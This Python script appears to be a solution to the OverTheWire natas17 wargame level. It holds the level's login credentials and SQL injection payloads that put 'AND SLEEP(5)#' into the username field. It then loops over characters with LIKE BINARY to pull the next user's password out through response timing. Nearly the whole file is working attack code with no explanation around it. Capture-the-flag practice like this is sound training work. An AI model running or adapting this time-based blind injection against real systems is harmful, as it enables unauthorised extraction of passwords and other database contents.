from requests import post
from requests.auth import HTTPBasicAuth

letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
address = 'http://natas17.natas.labs.overthewire.org/index.php?debug=1'
auth_data = HTTPBasicAuth('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
data_sample = {'username': 'natas18" AND password like "^" AND SLEEP(5)#'}
data_sample1 = {'username': 'natas15" AND SLEEP(5)#'}
simple_request = 'natas18" AND password like binary "{}{}%" AND SLEEP(5)#'


def get_time(obj):
    text = str(obj.elapsed)
    return float(text[-9:])


def is_successed(obj):
    time = get_time(obj)
    if time >= 5:
        # print("successed")
        return True
    else:
        # print("failed")
        return False


def make_request(stroke, letter):
    # print(stroke)
    return is_successed(post(address, auth=auth_data, data={'username': simple_request.format(stroke, letter)}))


passwd = ''
for i in range(0, 33):
    print(passwd)
    for letter in letters:
        if make_request(passwd, letter):
            passwd += letter
            break
